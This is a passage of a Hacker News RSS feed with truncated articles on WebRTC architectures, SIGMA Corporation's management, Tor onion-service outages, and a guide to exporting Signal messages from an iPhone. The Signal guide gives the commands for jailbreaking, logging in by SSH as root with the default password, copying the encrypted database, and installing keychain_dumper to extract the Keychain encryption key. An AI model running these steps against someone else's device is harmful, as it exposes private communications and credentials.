                <h3>Multipoint Conferencing Unit (MCUs)</h3>
      
                <p>The MCU architecture implies that each conference user sends a data stream to the MCU. The architecture decodes each of these streams, rescales them, composes a new one from all received, encodes it, and sends it back to users.</p>
      
                <p>Ultimately, MCU is an efficient and reliable solution for low-bandwidth networks.</p>
              </div>
            </div>
      
            <div>
              <figure uk-scrollspy="cls:uk-animation-slide-bottom; offset-top: -100">
                <img data-src="../../../images/blogposts/webrtc-vs-websockets/selective-forw-units.svg" alt="Innovation" src="https://requestum.com/images/blogposts/webrtc-vs-websockets/selective-forw-units.svg" data-was-processed="true">
              </figure>
      
              <div>
                <h3>Selective Forwarding Units</h3>
      
                <p>SFU is the most popular of modern approaches. In this architecture, users send media streams to a centralized server (SFU) and receive streams from other users through the same server. Selective Forwarding Units <span>WebRTC architecture</span> is suitable for ADSL, mobile, and cable networks. The main advantage of the architecture is its scalability.</p>
              </div>
            </div>
      
          </div>
      
          <h2>Websocket alternative 2020</h2>
      
          <p>IWhen…</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://requestum.com/webrtc-vs-websockets">https://requestum.com/webrtc-vs-websockets</a></em></p>]]>
            </description>
            <link>https://requestum.com/webrtc-vs-websockets</link>
            <guid isPermaLink="false">hacker-news-small-sites-25774854</guid>
            <pubDate>Thu, 14 Jan 2021 10:49:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Divarr]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25774473">thread link</a>) | @polm23
<br/>
January 14, 2021 | https://abagames.github.io/crisp-game-lib/?divarr | <a href="https://web.archive.org/web/*/https://abagames.github.io/crisp-game-lib/?divarr">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://abagames.github.io/crisp-game-lib/?divarr</link>
            <guid isPermaLink="false">hacker-news-small-sites-25774473</guid>
            <pubDate>Thu, 14 Jan 2021 10:02:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Path of the Little Samurai]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25774307">thread link</a>) | @Louno
<br/>
January 14, 2021 | https://www.ican.pl/b/the-path-of-the-little-samurai/P1GNmbgL6 | <a href="https://web.archive.org/web/*/https://www.ican.pl/b/the-path-of-the-little-samurai/P1GNmbgL6">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p id="DyaduWsNA_pl_main__4">In the recent years, what has become the most popular recipe for dealing with emerging unanticipated challenges is agile development, modeled on modern digital era companies. Meanwhile, SIGMA Corporation, a&nbsp;Japanese family company, combined in a&nbsp;remarkable way modern technologies with a&nbsp;traditional approach to doing business. This management model has perfectly proven its worth during the current crisis.</p><div><p id="DyaduWsNA_pl_main__6"><mark>POLSKOJĘZYCZNA WERSJA TEGO ARTYKUŁU » » »</mark></p><div><div><p><span><span>Tomasz Kulas <span>PL</span></span>, <span>Kazuto Yamaki </span></span></p><p>W ostatnich latach najpopularniejszą receptą na pojawiające się niespodziewane wyzwania stało się zwinne zarządzanie, wzorowane na nowoczesnych firmach ery cyfrowej. Tymczasem japońska firma rodzinna SIGMA Corporation w&nbsp;niezwykły sposób połączyła zaawansowane technologie z&nbsp;tradycyjnym podejściem do prowadzenia biznesu. Ten model zarządzania doskonale sprawdził się podczas obecnego kryzysu.</p></div><a href="https://www.ican.pl/a/DTqxlEZNz"><picture><img src="https://cdn.ican.pl/minimized/v2/360xAxA/reader-files/book/PQqjAvKR9/DTqxlEZNz/39/cover.jpg"></picture></a></div></div><p id="DyaduWsNA_pl_main__9">Even before I&nbsp;took over management from my father, SIGMA faced an enormous challenge of rising manufacturing costs. When we were launching our operations, manufacturing in Japan was relatively cheap compared to other countries, thus we could produce everything we wanted at home – and export our products at competitive prices abroad. However, along with the rise of standard of living in Japan, production costs have also been rising. This is why in the 90s almost all Japanese manufacturers of photography equipment decided to relocate manufacturing abroad.</p><figure data-resource-id="RXrRoI5RCAwtB" data-id="DyaduWsNA_pl_main__A"><div href="https://cdn.ican.pl/f/res-minimized/RXrRoI5RCAwtB/1607959888/qgMd47upElbJX4rfHXLSKtVq6jIrXdpY.jpg" data-lightbox="5ffebfe19ebf5" data-title="<div class=&quot;figcaption_content&quot;></div>"><picture><img src="https://cdn.ican.pl/f/res-minimized/RXrRoI5RCAwtB/1607959888/qgMd47upElbJX4rfHXLSKtVq6jIrXdpY.jpg" title="" alt="The Path of the Little Samurai"></picture></div><figcaption></figcaption></figure><p id="DyaduWsNA_pl_main__B"><em><span>Indeks górny <strong>Kazuto Yamaki</strong>, CEO, SIGMA Corporation. Indeks górny koniec</span></em></p><p id="DyaduWsNA_pl_main__F">At that time, SIGMA owned one factory only, located in Japan, in Fukushima Prefecture. We made a&nbsp;key decision then that production should stay at home. This is why we began to look for a&nbsp;solution that would still make it profitable. One of possible solutions would be to try to further lower radically the production costs, while another one would be to markedly raise the quality of our products, which would allow us to sell them at higher prices.&nbsp; We chose the second option, and I&nbsp;made all the employees aware that it’s the only way for SIGMA to survive.</p><p id="DyaduWsNA_pl_main__H"><em>In fact, I&nbsp;believe I&nbsp;have been lucky, as essentially we had no choice and there was nothing to think about. The thing was simple – product quality improvement was a&nbsp;must, if SIGMA was to survive.</em>&nbsp;<em>There was no other option.</em></p><h2 id="DyaduWsNA_pl_main__2Y">Culture of engagement </h2><p id="DyaduWsNA_pl_main__L">The one wonderful thing handed over to me by my father was the culture of collaboration within the company. All, really all of the employees understood what changes needed to be introduced and worked with high commitment to execute this new, quality‑based course of company development. I&nbsp;believe that also now, when many of our competitors can afford to offer their products at lower prices, as they have lower production costs, what distinguishes us is the level of commitment of our employees. They identify incredibly strongly with the company, while being at the same time really passionate about photography and about what they are doing.</p><p id="DyaduWsNA_pl_main__M">This difference may not be obvious to everybody, but it is key for us and determines our competitive advantage. If you are passionate about photography and manufacture photography equipment, at the same time to a&nbsp;highest possible degree you know what your customers need – as they are passionate about the same thing. This is the foundation on which we build customers’ trust for our company. To our advantage, it is impossible to launch production of highest class lenses overnight, as it requires not only the best technologies, but also many years of experience. This experience and commitment constitute our advantages and I&nbsp;believe, although of course I&nbsp;cannot be sure of that, that in spite of radical external changes that have taken place recently, they will allow us to continue operating under the current business model.</p><h2 id="DyaduWsNA_pl_main__2Z">Resilience in the times of crisis </h2><p id="DyaduWsNA_pl_main__O">Many company CEOs are currently facing the challenge of falling employee commitment. These CEOs are treated by these employees as “outside people” – professional managers whose task is about efficient management, no matter whom they manage and what&nbsp;the company does. However, my path was different, as I&nbsp;didn’t just take over the company from my father and didn’t just begin managing it.</p><p id="DyaduWsNA_pl_main__Q"><em>Right after graduation, I&nbsp;began to work at&nbsp; SIGMA&nbsp;at various different positions and in different departments – and it took almost twenty years.</em></p><p id="DyaduWsNA_pl_main__S">At that time, I&nbsp;met most of the people in various operational areas – designers, engineers, factory workers, business development, marketing and sales people. Of key importance was the fact that when I&nbsp;became the CEO, I&nbsp;already knew the people who worked there – and they knew me. Many of them, for that matter, have worked in a&nbsp;company for a&nbsp;dozen or a&nbsp;few dozen years.</p><div><h3 id="DyaduWsNA_pl_main__U">What does SIGMA Corporation do </h3><div><figure data-resource-id="R3WDWqaCWgAk3" data-id="DyaduWsNA_pl_main__V"><div href="https://cdn.ican.pl/f/res-minimized/R3WDWqaCWgAk3/1607959888/LtSolsFPkutnuWbxILvU3dM57NyPlZQd.jpg" data-lightbox="5ffebfe1a03d4" data-title="<div class=&quot;figcaption_content&quot;></div>"><picture><img src="https://cdn.ican.pl/f/res-minimized/R3WDWqaCWgAk3/1607959888/LtSolsFPkutnuWbxILvU3dM57NyPlZQd.jpg" title="" alt="The Path of the Little Samurai"></picture></div><figcaption></figcaption></figure></div><p id="DyaduWsNA_pl_main__W">SIGMA Corporation is a&nbsp;Japanese family company, known first of all as one of the major global camera lens manufacturers. It also makes digital cameras, flash lamps and other photography accessories, but it’s the lenses for the photo and video interchangeable‑lens cameras constitute its core business. It&nbsp;was founded in 1961 by Michihiro Yamaki, and since 2012 its CEO and owner has been his son, Kazuto Yamaki.</p><figure data-resource-id="R2vuVZQ7kFZ9d" data-id="DyaduWsNA_pl_main__X"><div href="https://cdn.ican.pl/f/res-minimized/R2vuVZQ7kFZ9d/1607959889/1dU52bYZ0v03IquPigz4WvYdvEb1pv6o.jpg" data-lightbox="5ffebfe1a153f" data-title="<div class=&quot;figcaption_content&quot;></div>"><picture><img src="https://cdn.ican.pl/f/res-minimized/R2vuVZQ7kFZ9d/1607959889/1dU52bYZ0v03IquPigz4WvYdvEb1pv6o.jpg" title="" alt="The Path of the Little Samurai"></picture></div><figcaption></figcaption></figure><p id="DyaduWsNA_pl_main__Y">Currently, the company employs 1,725 persons, with annual turnover (as of August 2019) at ca. PLN 1.4 billion. Company headquarters is located in the suburbs of Tokyo. The entire manufacturing is also located in Japan – in SIGMA‑owned Aizu factory, located in a&nbsp;small town of Bandai. Outside Japan, the company owns subsidiaries operating in North America, China, France, Hong Kong, Benelux countries, Germany and the UK. SIGMA Corporation products are officially sold and distributed in over 70 countries.</p></div><p id="DyaduWsNA_pl_main__Z">I&nbsp;believe that, for that matter, this is where the advantage of family companies is. Since being a&nbsp;kid I&nbsp;had been learning and growing into the organization, as our apartment was located on the last floor of the headquarters building of our company. <strong>Since being six‑seven years old, I&nbsp;had been meeting in a&nbsp;natural way many people who had worked at SIGMA</strong>, and my life was developing along with the growth of the company. This is why it was something natural that when I&nbsp;took over the management, employees tried as hard as they could to help me in performing the new role and in further growing the company.</p><p id="DyaduWsNA_pl_main__11">This traditional, family‑based managerial model turned out, in recent months, very resilient against the challenges the pandemic brought. In spite of SIGMA being a&nbsp;global operation, we are a&nbsp;relatively small company, thus it has been easier for individual people to understand the threats we are being faced with – and commit even more to helping the company and other co‑workers.</p><figure data-resource-id="RCQjHUyFdLfkh" data-id="DyaduWsNA_pl_main__12"><div href="https://cdn.ican.pl/f/res-minimized/RCQjHUyFdLfkh/1607959889/2LT1u5yj0xYhOujlip44SUH9weZKigkU.jpg" data-lightbox="5ffebfe1a28a0" data-title="<div class=&quot;figcaption_content&quot;></div>"><picture><img src="https://cdn.ican.pl/f/res-minimized/RCQjHUyFdLfkh/1607959889/2LT1u5yj0xYhOujlip44SUH9weZKigkU.jpg" title="" alt="The Path of the Little Samurai"></picture></div><figcaption></figcaption></figure><p id="DyaduWsNA_pl_main__13">In April 2020, we asked most of the employees (except, of course, those who worked in the factory) to begin working remotely – and almost 80% began working from home. Thus, our company, just like others, was challenged with maintaining good levels of internal communication. <strong>This is when I&nbsp;began to send messages to all the employees</strong> – about the present condition of the company, the situation on the market, how advanced individual projects are. In October, we began to admit a&nbsp;possibility of returning to the office, as many teams – the engineering ones in particular – wanted to go back to working this way. In spite of this, daily messages that I&nbsp;send via the internal blog of the company, are being continued – and I&nbsp;still try to provide as much information about the state of the company as possible.</p><p id="DyaduWsNA_pl_main__16"><em>I&nbsp;believe that&nbsp;good organizational culture is an underlying foundation of innovation, this is why I&nbsp;attach great importance to it.</em></p><p id="DyaduWsNA_pl_main__18">Fortunately, exceptional cases aside, I&nbsp;do not notice any fall in engagement among employees. This might also be caused by the fact that each new product we launched this year on the market has been very well received. Such positive feedback from the market undoubtedly also helps sustain motivation in the entire team in a&nbsp;situation when I&nbsp;am unable – during remote work – to fully commit to all the co‑workers.</p><h2 id="DyaduWsNA_pl_main__30">Global company, involved locally </h2><p id="DyaduWsNA_pl_main__1A">Another element which undoubtedly has an impact on a&nbsp;high&nbsp; level of engagement is our care about the local community. First of all, naturally, it’s about SIGMA employees, who simultaneously belong to the local community. We are a&nbsp;small company and we cannot afford big actions aimed at improving the situation globally, but we still do all our might for a&nbsp;company of that size. First, we care about our customers, our employees and our local community. If we can take care of them, take care of their happiness, it spreads through them all around the world. I&nbsp;believe that if we won’t be able to take care about the local community, we won’t be able to do this for people in other regions of the world.</p><p id="DyaduWsNA_pl_main__1B">It is particularly important in current times – the only thing that will help us survive the difficult situation related with the pandemic is efficient teamwork of content, happy, loyal and engaged employees. This is also the second reason – except betting on the quality of equipment we manufacture – for which we are not planning to move production abroad. We want, as long as&nbsp; possible, to take care of our employees, as opening a&nbsp;factory somewhere with lower production costs would probably mean not only higher profits for the company, but also a&nbsp;necessity to lay off many people from the home factory. We don’t want to allow for that to happen, we feel responsible for those people.</p><p id="DyaduWsNA_pl_main__1D"><em>For that matter, when speaking of “Japanese quality”, I&nbsp;do not mean any singular, unique traits of our nation. I&nbsp;mean individual people, who have experience in lens manufacturing – as it is still partly an “analog” production process.</em></p><p id="DyaduWsNA_pl_main__1F">We can quite easily transfer the technology behind manufacturing of our equipment, experience, however, is a&nbsp;quality that you cannot transfer so simply and easily – in spite of very advanced automation and digitization of our manufacturing processes. They still contain many stages where it is the “human factor” that counts the most. …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.ican.pl/b/the-path-of-the-little-samurai/P1GNmbgL6">https://www.ican.pl/b/the-path-of-the-little-samurai/P1GNmbgL6</a></em></p>]]>
            </description>
            <link>https://www.ican.pl/b/the-path-of-the-little-samurai/P1GNmbgL6</link>
            <guid isPermaLink="false">hacker-news-small-sites-25774307</guid>
            <pubDate>Thu, 14 Jan 2021 09:48:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Exporting Messages from Signal for iOS: A Journey]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25774200">thread link</a>) | @DavidSJ
<br/>
January 14, 2021 | https://cight.co/backup-signal-ios-jailbreak/?resubmit=1 | <a href="https://web.archive.org/web/*/https://cight.co/backup-signal-ios-jailbreak/?resubmit=1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>I started using Signal 5 years ago as I became increasingly conscious of my data footprint. Around the same time, I closed my Facebook and Instagram accounts, and later, my Google Account.</p><h2 id="the-problem-with-signal">The problem with Signal</h2><p>Signal makes it very difficult, and in most cases, impossible, for one to back up, export, or migrate message data. The Signal team insists these restrictions are meant to protect users’ privacy. However, backup and migration policies differ for each official Signal client and sometimes contradict each other.</p><p>For example, while iOS offers no official backups process, Android backups are built into the app. At the same time, iOS users can migrate their data to a new device (as long as their phone number hasn’t changed), but this is impossible on Android. Meanwhile, decrypting messages from the desktop client is trivial, but linking one’s phone and desktop client only syncs messages forward in time.</p><h2 id="why-export-signal-s-message-history">Why export Signal's message history</h2><p>Because it’s my fucking data.</p><p>The road to exporting my data was long, frustrating and filled with dead ends – it took over a year to get here. What's paradoxical is that someone else's phone turned out to be the key to my data. </p><p>In recent years, I moved most of my conversations to Signal, including those with family and close friends. Shortly after we started dating, I asked my partner to switch to Signal, and we’ve used it exclusively ever since. At some point, I thought it would be nice to export our conversation history – a sort of time capsule of our relationship. “Easy,” I thought. I was wrong.</p><p>Since we started dating, I had switched from a OnePlus 2 to an iPhone XS Max. And since migrating from Android to iOS isn’t possible, part of our conversation history was locked on my old phone. Jailbreaking the iPhone was out of the question since my version of iOS had not been jailbreaken. The Signal Desktop client could have offered an easy avenue to decrypt our chat history, but there was a period of several months during which I had not linked my iPhone to the Signal desktop client.</p><p>I opened a <a href="https://community.signalusers.org/t/ios-backups-through-the-desktop-client/8123">thread about this in the Signal Community Forum</a> in June of 2019. It quickly became apparent that backing up my Signal data would be an uphill battle. </p><p>Luckily, my partner had an iPhone 7, which she recently replaced with a company phone. Her old iPhone contained our entire message history in one place and was easy to jailbreak. Jackpot.</p><p>One important lesson I learned during this process:<strong> to ensure access to your conversation history, install the Desktop client and link it to your mobile device as soon as you start using Signal. </strong>The Signal database and encryption key are both accessible on your computer, allowing for easy decryption. Linking the desktop client later will only sync messages forward in time from the moment the devices are linked.</p><h2 id="tips-to-increase-your-chances-of-exporting-your-signal-database">Tips to increase your chances of exporting your Signal database</h2><p>If you haven’t linked the desktop client and extracting the iOS database is your only option, this guide is for you. If you've decided to embark upon this journey, here's some advice. </p><h3 id="stop-updating-ios">Stop updating iOS</h3><p>Your best chance of jailbreaking iOS is on older firmware versions. Turn off automatic updates and decline prompts to update iOS.</p><h3 id="backup-shsh-blobs-with-every-new-ios-update">Backup SHSH blobs with every new iOS update</h3><p><a href="https://en.wikipedia.org/wiki/SHSH_blob">SHSH blobs</a> are the digital signatures that Apple generates and uses to personalize iOS firmware files for each iOS device. Apple only signs firmware updates for a limited time after release. Having these signatures handy allows one to install versions of iOS after Apple stops signing them – like when a jailbreak becomes available for that version. In some cases, you may be able to downgrade iOS to a previous version.</p><p>Backup SHSH blobs every time Apple releases a new version of iOS (e.g., 14.0, 14.1, 14.1.1). I personally use the <a href="https://github.com/airsquared/blobsaver">blobsaver</a> app, but <a href="https://tsssaver.1conan.com/v2/">TSS Saver</a> is a popular alternative.</p><h3 id="learn-about-jailbreaking-and-stay-up-to-date-on-developments">Learn about jailbreaking and stay up to date on developments</h3><p>Developers and hackers are constantly working to break the security of iOS, and new methods to jailbreak iPhones are frequently made public. Stay informed on jailbreak releases by following the <a href="https://www.reddit.com/r/jailbreak/">/r/jailbreak subreddit</a>.</p><p>This <a href="https://docs.google.com/spreadsheets/d/11DABHIIqwYQKj1L83AK9ywk_hYMjEkcaxpIg6phbTf0/edit#gid=1014970938">exhaustive list of jailbreak compatibility</a> by device and iOS version is also a great resource.</p><p>It's also useful to understand the difference between <a href="https://www.theiphonewiki.com/wiki/Untethered_jailbreak">untethered</a>, <a href="https://www.theiphonewiki.com/wiki/Semi-untethered_jailbreak">semi-untethered</a>, <a href="https://www.theiphonewiki.com/wiki/Semi-tethered_jailbreak">semi-tethered</a>, and <a href="https://www.theiphonewiki.com/wiki/Tethered_jailbreak">tethered</a> jailbreaks.</p><h3 id="recognize-that-this-may-not-work">Recognize that this may not work</h3><p>Depending on your iPhone, you might never be able to jailbreak it or extract Signals decryption key from the iOS Keychain. Apple is making it increasingly difficult to jailbreak iOS devices – improvements to hardware and software are leaving fewer cracks for hackers to exploit.</p><p>Ok, let's get our hands dirty. </p><h2 id="how-to-maybe-backup-signal-for-iphone">How to (maybe) backup Signal for iPhone </h2><p>This guide explains how I was able to backup and extract data from Signal's encrypted SQLite database on an iPhone 7 with iOS 13.6.1. </p><h3 id="prerequisites">Prerequisites </h3><ul><li>Physical access to the iPhone with Signal still installed</li><li>An original iPhone cable</li><li>A Mac or Linux computer</li><li>Patience and a bit of luck</li></ul><p>Shell environments will be differentiated as such. </p><pre><code>// Host machine
$ &lt;command&gt;

// iPhone 
root# &lt;command&gt;</code></pre><h3 id="step-1-jailbreak-ios">Step 1: Jailbreak iOS</h3><p>For iOS 13.6.1 on an iPhone 7, I used <strong>checkra1n</strong> which offers a straight forward semi-tethered jailbreak. Depending on the iPhone device and version of iOS, a jailbreak may or may not be available. </p><p>See this <a href="https://docs.google.com/spreadsheets/d/11DABHIIqwYQKj1L83AK9ywk_hYMjEkcaxpIg6phbTf0/edit#gid=1014970938">updated list of iOS jailbreaks</a> for device compatibility and instructions. </p><h3 id="step-2-ssh-into-the-iphone">Step 2: SSH into the iPhone </h3><p>Cydia usually comes with OpenSSH installed and enabled, allowing shell access over IP or USB. If SSH access isn't activated, launch Cydia and install OpenSSH. </p><p><strong>As always, the root password on iOS is <code>alpine</code>.</strong></p><p>If the iPhone and the host machine are on the same network, SSH into the phone using its IP address. It may be found in the phone's WiFi settings. </p><pre><code>$ ssh root@[iphone ip] -p 22</code></pre><p>If SSH over the air isn't possible, USB may be an alternative. However, this involves enabling a proxy service on the host machine.</p><p>First, install <em><em>libimobiledevice</em></em> on the host machine. </p><pre><code>$ brew install libimobiledevice</code></pre><p>Then, edit <em><em>com.usbmux.iproxy.plist</em></em> and append the following XML to the file. </p><pre><code>$ nano ~/Library/LaunchAgents/com.usbmux.iproxy.plist</code></pre><pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
&lt;key&gt;Label&lt;/key&gt;
&lt;string&gt;com.usbmux.iproxy&lt;/string&gt;
&lt;key&gt;ProgramArguments&lt;/key&gt;
&lt;array&gt;
&lt;string&gt;/usr/local/bin/iproxy&lt;/string&gt;
&lt;string&gt;2222&lt;/string&gt;
&lt;string&gt;22&lt;/string&gt;
&lt;/array&gt;
&lt;key&gt;RunAtLoad&lt;/key&gt;
&lt;true/&gt;
&lt;key&gt;KeepAlive&lt;/key&gt;
&lt;true/&gt;
&lt;/dict&gt;</code></pre><p>And finally, launch the proxy on the host machine. </p><pre><code>$ launchctl load ~/Library/LaunchAgents/com.usbmux.iproxy.plist</code></pre><p>It should now be possible to SSH into the iPhone over USB on port <code>2222</code>.</p><pre><code>$ ssh root@localhost -p 2222</code></pre><h3 id="step-3-install-required-packages">Step 3: Install required packages </h3><p>Once logged into to the iPhone's shell, install the following packages as they will come in handy. </p><pre><code>root# apt install zip unzip nano wget</code></pre><h3 id="step-4-backup-the-signal-data-directory">Step 4: Backup the Signal data directory</h3><p><strong>Locate Signal's data directory</strong></p><p>Much like macOS, iOS stores application data in a <em>Library</em>-like directory. In iOS&nbsp;13, its located here <code>/private/var/mobile/Containers/Shared/AppGroup/</code>. </p><p>Signal's data directory contains the encrypted SQLite database file in <code>./grdb/signal.sqilte</code> and attachments, such as images and videos in <code>./Attachments</code>.</p><p>The data directory may be found by searching the filesystem for Signal's encrypted database file, <code>signal.sqlite</code>.</p><pre><code>root# find / -type f -iname "signal.sqlite"</code></pre><p>That should return something which looks like this:<br><code>/private/var/mobile/Containers/Shared/AppGroup/01484069-3446-4CC0-8BE7-7464E7D08FDF/grdb/signal.sqlite</code> </p><p>The Signal directory is: <code>/private/var/mobile/Containers/Shared/AppGroup/01484069-3446-4CC0-8BE7-7464E7D08FDF/</code></p><p><strong>Zip the Signal directory</strong></p><p>It is recommended to zip the entire directory, not only the database file, as it also contains images and other message attachments. This archive can reach several gigabytes.</p><pre><code>root# cd /private/var/mobile/Containers/Shared/AppGroup/
root# zip -r signal-backup.zip &lt;Signal directory&gt;

# ex: zip -r signal-backup.zip /private/var/mobile/Containers/Shared/AppGroup/01484069-3446-4CC0-8BE7-7464E7D08FDF/</code></pre><p><strong>Retrieve the backup on the host machine</strong></p><p>In a new terminal session on the host machine, use <code>scp</code> to copy the backup. </p><pre><code>$ scp -P 22 root@localhost:/private/var/mobile/Containers/Shared/AppGroup/signal-backup.zip ~/</code></pre><p>Once complete, verify that the backup has fully transferred by unpacking it.</p><p>This is the most complex part of this operation and it helps to have a basic understanding of core iOS development concepts.</p><p><strong>Understanding iOS Entitlements </strong></p><p>From the <a href="https://developer.apple.com/documentation/bundleresources/entitlements">Apple Developer Documentation</a>: </p><blockquote>An entitlement is a right or privilege that grants an executable particular capabilities. For example, an app needs the HomeKit Entitlement — along with explicit user consent — to access a user’s home automation network. An app stores its entitlements as key-value pairs embedded in the code signature of its binary executable.</blockquote><p><strong>Enter Keychain Dumper</strong></p><p>We will use <a href="https://github.com/ptoomey3/Keychain-Dumper"><strong>Keychain-Dumper</strong></a> to attempt extracting the Signal encryption key. It requires entitlements to access Keychain data for any particular app. </p><p>Reading through Keychain-Dumper's GitHub issues, I learned that entitlements changed in iOS 13.5 – prior to this version, an application <a href="https://github.com/ptoomey3/Keychain-Dumper/issues/52#issuecomment-638174691">could be given wildcard entitlements</a>. Changes in 13.5 made it such that apps need specific entitlements. Thankfully, it's possible to update an executable's entitlements, even as a binary.</p><p>The <code>keychain_dumper</code> binary included in its <a href="https://github.com/ptoomey3/Keychain-Dumper">GitHub repo</a> has wildcard entitlements. We'll need to update them in order to give it permission to decrypt the Signal key.</p><p><strong>Install Keychain Dumper on the iPhone</strong></p><p>Back on the iPhone, download and extract the <a href="https://github.com/ptoomey3/Keychain-Dumper/releases/tag/1.0.0">keychain_dumper binary</a>, and move it to <code>/usr/bin</code>.</p><pre><code>root# wget https://github.com/ptoomey3/Keychain-Dumper/releases/download/1.0.0/keychain_dumper-1.0.0.zip
root# unzip keychain_dumper-1.0.0.zip
root# mv keychain_dumper /usr/bin</code></pre><p><strong>Update <em>keychain_dumper</em>'s …</strong></p></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cight.co/backup-signal-ios-jailbreak/?resubmit=1">https://cight.co/backup-signal-ios-jailbreak/?resubmit=1</a></em></p>]]>
            </description>
            <link>https://cight.co/backup-signal-ios-jailbreak/?resubmit=1</link>
            <guid isPermaLink="false">hacker-news-small-sites-25774200</guid>
            <pubDate>Thu, 14 Jan 2021 09:38:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tracking Tor's network-wide V3 onion service outages]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25774167">thread link</a>) | @thinkingemote
<br/>
January 14, 2021 | https://matt.traudt.xyz/posts/tracking-tors-network-wide-v3-onion-service-outages | <a href="https://web.archive.org/web/*/https://matt.traudt.xyz/posts/tracking-tors-network-wide-v3-onion-service-outages">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article class="page">







<div id="pagebody">

<section id="content" role="main">



<p>It is January 13th, 2021 as I finish writing these initial words. Major updates may get
a date stamp next to them.</p>



<ul>
<li><em>Someone</em> is sending the directory authorities (and fallback dirs) lots of
traffic.</li>
<li>This causes the dirauths to no longer be able to reliably communicate.</li>
<li>This means consensuses are no longer reliably produced every hour.</li>
<li>No new consensus three hours in a row means new connections to v3 onion
services stop working because of <a href="https://gitlab.torproject.org/tpo/core/tor/-/issues/40237">a bug</a>.  Existing connections survive,
and no other part of Tor breaks at the three hour mark.</li>
<li>There is an <a href="https://blog.torproject.org/node/1969">alpha release</a> for <strong>experts who know what they are
doing</strong>.  It is making its way into all supported stable Tor versions.</li>
</ul>


<p>Please keep these facts in mind:</p>

<ul>
<li><p><strong>It is unknown if the traffic hitting the dirauths is maliciously
motivated</strong>. People keep calling it an <em>attack</em>. I don't think we have the
evidence to back that up at this time.</p></li>
<li><p><strong>There is no evidence that the traffic overload is actively trying to hurt
v3 onions</strong>.  A <a href="https://gitlab.torproject.org/tpo/core/tor/-/issues/33018">similar situation existed last year</a> and onions
didn't go down then. Claims that it is "the" government or rival drug markets
are not backed up with any evidence that I've seen.</p></li>
</ul>


<p>If you have evidence of who is behind this traffic, please let someone know.
<a href="https://support.torproject.org/get-in-touch/">Tor Project</a> or me
(blog comment, an email <small>(listed on <a href="https://matt.traudt.xyz/posts/about-me-6eKe2i5v/">About
Me</a>)</small>, or IRC message)</p>

<p><small>While I currently work on Tor-related stuff for my job, nothing contained in this
post has anything to do with my work. Everything contained in this post is public unclassified
knowledge. Opinions expressed, if any, are my own.</small></p>



<p>Roger points out on January 6th that
<a href="https://lists.torproject.org/pipermail/tor-relays/2021-January/019201.html">"the overload is back"</a>.</p>

<p>It's not OMGWTFBBQ levels of traffic. It's not from one IP nor is it from IPs
all over the Internet. One dirauth says it <em>seems</em> to be a poorly written
custom Tor client requesting directory information too often.</p>



<p>On January 9th, 10th, and 11th, there are repeated instances of 3 or more
consensuses in a row that are not generated.</p>

<p>This is the trigger for v3 onions no longer working. Consensuses are generated
every hour and are valid for 3 hours. Most parts of Tor (v2 onions, general
circuit building, etc.) do not require a <em>live</em> (currently valid) consensus,
but can get by just fine with a recently valid consensus (expired less than 24
hours ago).</p>

<p>January 12th saw a few missed consensuses, but never 3 in a row. No consensus has been missed so far on the 13th.</p>



<p>The v3 onion service code was written to require a live consensus, and it didn't need to be (devs
are verifying this). The <a href="https://lists.torproject.org/pipermail/tor-talk/2021-January/045681.html">fix</a> for this <a href="https://gitlab.torproject.org/tpo/core/tor/-/issues/40237">bug</a>
changes the requirement to just a recently valid consensus. It's getting tested
as I write these words on January 11th. The fix, or something very similar to
it, will be merged and backported in the coming days, at which point it's up to
the packagers for your OS or your tor-derived software (e.g. Tor Browser) to
notice the update and distribute it to you. I would expect Tor Browser to be updated very quickly.
Debian will probably take a day or two. Other distros, I have no idea.</p>

<p>If you're watching tor's logs, the current date includes "January" and "2021",
and you see the following message, then you have most likely hit the bug.</p>

<pre><code>Tried for 120 seconds to get a connection to [scrubbed]:6697. Giving up. (waiting for rendezvous desc)
</code></pre>

<p>The 6697 is <em>not</em> important. The "waiting for rendezvous desc" <em>is important</em>.</p>

<h2><a name="index1h2"></a>Status of the fix making it into Tor</h2>

<p>Primary sources for this section: <a href="https://gitlab.torproject.org/tpo/core/tor/-/issues/40237">bug #40237</a>.</p>

<ul>
<li>Jan 12th: the fix is merged into 0.4.5.3-rc [<a href="https://blog.torproject.org/node/1969">blog post</a>]</li>
</ul>


<p>Upcoming events:</p>

<ul>
<li>backports to other supported versions of Tor</li>
<li>packaging</li>
</ul>




<p>On the 11th we
<a href="https://lists.torproject.org/pipermail/tor-consensus-health/2021-January/011815.html">notice</a>
the fallback dirs are also failing.
This is major evidence in my opinion that this is not a purposeful attack on the dirauths. I, and at least two dirauths, think it is most likely a bad custom Tor client implementation that requests directory information too often.</p>

<p>We see the same failing of fallback dirs <a href="https://lists.torproject.org/pipermail/tor-consensus-health/2021-January/011840.html">on the 12th</a>.</p>

